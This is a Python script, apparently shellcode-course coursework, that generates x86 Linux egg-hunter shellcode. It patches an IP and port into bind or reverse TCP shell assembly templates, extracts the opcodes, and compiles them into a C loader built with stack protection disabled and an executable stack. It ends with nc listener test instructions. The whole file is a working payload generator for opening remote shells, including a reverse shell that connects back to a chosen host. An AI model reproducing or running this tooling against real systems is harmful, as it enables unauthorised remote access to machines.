#!/usr/bin/python3

import argparse
import sys
import os
import socket

def convert_args(address, port):
	
	address = socket.inet_aton(address).hex()
	le_address = bytearray.fromhex(address)
	le_address.reverse()
	address = "0x{0}".format(''.join(format(x, '02x') for x in le_address))

	address = hex(int(address, 16) ^ 0xffffffff)

	port = hex(socket.htons(port))

	return address, port
	
def set_args(payload, address, port):

	address, port = convert_args(address, port)
	
	asm = open("tcp_{}_shell_x86.nasm".format(payload), 'rt')
	data = asm.read()
	
	if payload == "reverse":
		data = data.replace('ADDRESS', address)
		data = data.replace('PORT', port)
	
	elif payload == "bind":
		data = data.replace('PORT', port)
	
	asm.close()
	asm = open('tmp.nasm', 'wt')
	asm.write(data)
	asm.close()

def set_shellcode(egghunter, shellcode):
	
	shellcode_file = open("shellcode.c", "rt")
	data = shellcode_file.read()
	data = data.replace("EGGHUNTER", egghunter)
	data = data.replace("SHELLCODE", shellcode)

	shellcode_file.close()
	shellcode_file = open("tmp.c", "wt")
	shellcode_file.write(data)
	shellcode_file.close()

def gen_shellcode(filename):
	
	stream = os.popen("""objdump -d {} |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'""".format(filename))
	shellcode = stream.read().rstrip()
	return shellcode.strip('"')

def print_egghunter(shellcode, technique):
	
	print("\n[*] Generating shellcode for x86 egg hunter using {} technique".format(technique))
	print("[*] Egg hunter length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print('"' + shellcode + '"')

def print_shellcode(shellcode, payload, address, port):
	
	print("\n[*] Generating shellcode for x86 TCP {0} shell on {1}:{2}".format(payload, address, port))
	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print('"' + shellcode + '"')

def main():

	parser = argparse.ArgumentParser(description='Generate x86 egg hunter shellcode.')
	payload_choices = ['bind', 'reverse']
	parser.add_argument('-t', '--technique', type=str, help='Technique to use for egghunter.', choices=['access', 'sigaction'])
	parser.add_argument('-x', '--payload', type=str, help='Type of payload to execute', choices=payload_choices)
	parser.add_argument('-l', '--lhost', required=(payload_choices[1] in sys.argv), type=str, help='Remote IPv4 address for TCP reverse shell to connect to.', default="127.0.0.1")
	parser.add_argument('-p', '--lport', type=int, help='Remote port for TCP reverse shell to connect to.', choices=range(0,65535), metavar="{0..65535}", default=4444)
	parser.add_argument('-s', '--shellcode', help='Output shellcode only')
	
	args = parser.parse_args()
	
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()

	if args.lhost:
		try:
			socket.inet_aton(args.lhost)
		except:
			print("[-] Invalid IP address entered. Exiting...")
			sys.exit()

	# Modify the host address and port in tcp_reverse_shell_x86.nasm
	set_args(args.payload, args.lhost, args.lport)

	shell_filename = "tcp_{}_shell_x86".format(args.payload)

	if args.technique == "access":
		egg_filename = "egg_hunter_access_2_x86"
	elif args.technique == "sigaction":
		egg_filename = "egg_hunter_sigaction_x86"

	# Link and assemble egg hunter shellcode
	os.system('nasm -f elf32 -o {0}.o {0}.nasm'.format(egg_filename))
	os.system('ld -o {0} {0}.o'.format(egg_filename))

	# Link and assembly second stage shellcode	
	os.system('nasm -f elf32 -o {}.o tmp.nasm'.format(shell_filename))
	os.system('ld -o {0} {0}.o'.format(shell_filename))

	# Egg pattern
	egg = "\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50"
		
	# Dump the egg hunter shellcode using objdump
	egghunter = gen_shellcode(egg_filename)
	
	# Dump the second stage shellcode using objdump
	shellcode = egg + gen_shellcode(shell_filename)

	if args.shellcode:
		# Print egg hunter shellcode
		print_egghunter(egghunter, args.technique)

		# Print second stage shellcode
		print_shellcode(shellcode, args.payload, args.lhost, args.lport)
		sys.exit()

	# Place the generated egg hunter and second stage shellcode into C skselton file
	set_shellcode(egghunter, shellcode)

	# Compile C skeleton file
	os.system('gcc -fno-stack-protector -z execstack tmp.c -o egg_hunter_{}_x86'.format(args.payload))

	print("\n[*] Compiled shellcode for x86 egg hunter".format(args.technique, args.payload))
	print("[*] Technique: {}(2)".format(args.technique))
	print("[*] Payload: {} shell".format(args.payload))
	if args.payload == "bind":
		print("[*] Test by executing: ./egg_hunter_bind_x86 and connecting with nc {0} {1}".format(args.lhost, args.lport))
	if args.payload == "reverse":
		print("[*] Test by starting a listener with nc -nlvp {} and executing ./egg_hunter_reverse_x86".format(args.lport))
	
	# Cleanup
	os.system('rm tmp.nasm')
	os.system('rm tmp.c')
	os.system('rm *.o'.format(args.payload))
	os.system('rm tcp_{}_shell_x86'.format(args.payload))
	
	if args.technique == "access":
		os.system('rm egg_hunter_access_2_x86')
	elif args.technique == "sigaction":
		os.system('rm egg_hunter_sigaction_x86')

if __name__ == "__main__":
	main()
